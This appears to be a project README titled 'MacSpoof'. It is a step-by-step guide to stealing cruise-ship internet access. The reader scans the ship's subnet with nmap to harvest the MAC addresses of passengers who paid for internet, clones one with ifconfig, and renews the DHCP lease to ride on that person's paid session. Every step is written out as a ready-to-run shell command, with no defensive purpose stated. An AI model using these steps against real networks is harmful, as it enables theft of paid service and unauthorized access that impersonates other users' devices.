MacSpoof
========

Utilizes nmap, dhclient, and wpa_supplicant

<p><a href="url"><img src="http://i.imgur.com/upABDr6.jpg" height="600" width="480" ></a></p>

========


Chances are that aboard a cruise ship with a maximum capacity of 5,000+ people, a few dozen will have already purchased an internet package. What we want to do is spoof our computer’s MAC Address to match that of those computers who are already connected to the network. If a computer is logged in and has access to the internet, any computer with the same MAC Address will have access to the internet as well. This means we can "piggy-back" on someone else's package. AND, if they only paid for one device, it won't kick them off. 

We assume several things here. First, that the computer has gotten past the login page. It is highly likely that someone won’t just be staring at the login page while connected to the network for more than 5 minutes. Second, that the router will actually give us an IP address. This is important, without an IP address we won't be able to connect. Third, the router will let us connect. There are thousands of access points aboard the ship. If we fail to connect successfully with a particular BSSID, we must try another one. Luckily, wpa_supplicant does this automatically. 


Install the following packages:

* nmap
* wpa_supplicant      (default)
* ip link or ifconfig (default)

Requirements:
* Linux
* Wireless interface


1. Connect to the network. Make sure you do this via **wpa_supplicant**. It will make reassociating with the network easier when you change your MAC Address and request an IP from a router. 
NOTE: On Ubuntu, network-manager runs in the background. It needs to be disabled while **wpa_supplicant** is running! 

        sudo stop network-manager
        sudo wpa_supplicant -D nl08211 -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf`

2. Scan the network for connected devices. We want the MAC Addresses. You must run nmap as sudo. Otherwise you will not get any MAC Addresses. We will scan the entire subnet from 172.27.20.0 to 172.27.20.255. Your IP range depends on the IP address given to you when you first connected to the network. This will let you know which node you have connected to. /<numbits> are the same as the reference IP or hostname given. There are 32 bits in an IPv4 address. We keep 24 fixed, the last 8 bits are variable. 

        sudo nmap -sP 172.27.20.0/24

3. nmap should produce an output similar to this:

        Nmap scan report for WiMaxCPE (192.168.15.1)
        Host is up (0.0024s latency).
        MAC Address: 00:1D:88:30:71:8D (Clearwire)
        Nmap scan report for ThinkPad-W530 (192.168.15.253)
        MAC Address: 00:1D:88:30:64:1D (ThinkPad) 
        Host is up.
        ...

4. Spoof your MAC Address

        sudo ifconfig wlan0 down hw ether 00:1D:88:30:64:1D
        sudo ifconfig wlan0 up

5. Obtain a DHCP lease from the router. The router will give you an IP address upon success. Then you are all set!
        sudo dhclient -r
        sudo dhclient -v wlan0

6. Visit any webpage. You should not be redirected to a login page if owner of the MAC Address has paid for internet. 

7. ???

8. PROFIT



=====

Guandi97
EngineerisEngieHere

